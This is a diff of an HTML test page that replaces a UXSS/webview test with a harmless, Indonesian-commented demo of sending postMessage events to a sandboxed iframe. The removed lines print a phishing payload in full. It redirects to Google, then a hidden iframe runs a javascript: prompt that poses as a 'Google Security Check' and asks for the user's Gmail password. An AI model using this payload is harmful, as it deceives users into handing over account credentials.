@@ -1,35 +1,60 @@
-<!DOCTYPE html>
-<html lang="en-US">
+<!doctype html>
+<html lang="id">
 <head>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, user-scalable=no">
-	<title>Bypass Sandbox Webview UXSS Redirect Test</title>
-	
-	<style>
-		iframe {
-			visibility: hidden;
-		}
-	</style>
-
-	<script>
-		function triggerRedirect() {
-			// Redirect ke domain google
-			window.location.href = "https://google.com";
-
-			// Setelah redirect, siapkan delayed prompt injection
-			setTimeout(function() {
-				document.getElementById("iframe").src = 
-					"javascript:prompt('Google Security Check\\n\\nPlease enter your Gmail / Password to continue:', 'Email / Password')";
-			}, 1500); // delay biar terkesan setelah redirect
-		}
-	</script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Demo Event → iframe (aman)</title>
+  <style>
+    body { font-family: system-ui, sans-serif; padding: 24px; }
+    .box { margin: 12px 0; }
+    iframe { width: 100%; height: 160px; border: 1px solid #ccc; }
+  </style>
 </head>
-
 <body>
-	<center>
-		<br><br>
-		<h1><a href="javascript:triggerRedirect()">Click Here</a></h1>
-	</center>
-	<iframe id="iframe"></iframe>
+  <h2>Demo: Event lain selain <code>onblur</code></h2>
+
+  <div class="box">
+    <button id="btnClick">Klik saya (onclick)</button>
+    <button id="btnHover">Hover saya (onmouseover)</button>
+    <input id="inpFocus" placeholder="Fokuskan saya (onfocus)" />
+  </div>
+
+  <iframe id="targetFrame" sandbox="allow-scripts" srcdoc="
+    <!doctype html><html><body>
+      <h3>Iframe aman</h3>
+      <div id='output'>Menunggu pesan...</div>
+      <script>
+        window.addEventListener('message', function(ev){
+          // TAMPILKAN PESAN — validasi origin perlu pada implementasi nyata
+          document.getElementById('output').textContent = 'Pesan diterima: ' + ev.data;
+          // hanya contoh: menampilkan alert (tidak melakukan anything sensitive)
+          alert('Iframe menerima: ' + ev.data);
+        }, false);
+      </script>
+    </body></html>
+  "></iframe>
+
+  <script>
+    const iframe = document.getElementById('targetFrame');
+    const btnClick = document.getElementById('btnClick');
+    const btnHover = document.getElementById('btnHover');
+    const inpFocus = document.getElementById('inpFocus');
+
+    // Helper: kirim pesan ke iframe (pastikan origin bila di produksi)
+    function sendToIframe(msg) {
+      // contoh: gunakan origin konkret dalam implementasi nyata, jangan "*"
+      iframe.contentWindow.postMessage(msg, '*');
+    }
+
+    btnClick.onclick = () => sendToIframe('Triggered by onclick button');
+    btnHover.onmouseover = () => sendToIframe('Triggered by onmouseover button');
+    inpFocus.onfocus = () => sendToIframe('Triggered by onfocus input');
+
+    // juga tunjukkan event chaining: timer setelah focus
+    inpFocus.onfocus = () => {
+      sendToIframe('Focus event — starting delayed action');
+      setTimeout(()=> sendToIframe('Delayed message after 1s'), 1000);
+    };
+  </script>
 </body>
 </html>
